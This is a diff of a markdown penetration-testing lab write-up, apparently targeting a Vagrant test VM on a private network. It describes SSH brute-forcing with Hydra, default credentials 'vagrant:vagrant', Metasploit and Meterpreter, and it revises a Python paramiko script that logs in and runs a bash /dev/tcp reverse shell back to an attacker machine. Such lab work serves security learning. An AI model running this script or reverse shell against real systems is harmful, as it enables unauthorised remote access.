@@ -38,7 +38,7 @@ Successful ICMP replies confirm two-way communication is established.
     ```
 <img width="695" alt="Screenshot 2025-04-21 195543" src="https://github.com/user-attachments/assets/49b83e0a-cf98-49e4-b86a-e7f53381f40d" />
 
-    - Identified OpenSSH running on port 22
+Identified OpenSSH running on port 22
  
  2. **Brute-Force with Hydra**:
     ```bash
@@ -46,7 +46,7 @@ Successful ICMP replies confirm two-way communication is established.
     ```
 <img width="527" alt="Screenshot 2025-04-21 221524" src="https://github.com/user-attachments/assets/6ee6884e-569b-4013-b543-28b949035cfe" />
 
-    - Discovered working credentials: `vagrant:vagrant`
+- Discovered working credentials: `vagrant:vagrant`
  
  3. **Exploit with Metasploit**:
     ```
@@ -74,7 +74,7 @@ Successful ICMP replies confirm two-way communication is established.
 <img width="773" alt="Screenshot 2025-04-22 000304" src="https://github.com/user-attachments/assets/70e3dd0d-61f7-41d5-b7f3-6b5e7b1061a0" />
 <img width="720" alt="Screenshot 2025-04-22 000244" src="https://github.com/user-attachments/assets/84dc529f-e7a7-4458-a8ff-12f9a80a8d15" />
 
-    - Upgraded shell to Meterpreter session
+  - Upgraded shell to Meterpreter session
  
  
  ## Task 1.2: Exploit via Custom Python Script
@@ -85,22 +85,21 @@ Successful ICMP replies confirm two-way communication is established.
 
  ### Python Script: `ssh_bruteforce_reverse.py`
  ```python
- import paramiko
- import time
- 
- host = "192.168.142.131"
- port = 22
- username = "vagrant"
- password = "vagrant"
- reverse_shell_cmd = "bash -i >& /dev/tcp/192.168.142.129/4444 0>&1"
- 
- client = paramiko.SSHClient()
- client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
- client.connect(host, port=port, username=username, password=password)
- 
- stdin, stdout, stderr = client.exec_command(reverse_shell_cmd)
- time.sleep(2)
- client.close()
+import paramiko
+
+target_ip = "192.168.142.131"
+username = "vagrant"
+password = "vagrant"
+lhost = "192.168.142.129"
+lport = "4444"
+payload = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+
+client = paramiko.SSHClient()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+client.connect(target_ip, username=username, password=password)
+client.exec_command(payload)
+client.close()
+
  ```
  
  ### Listener on Attacker Machine
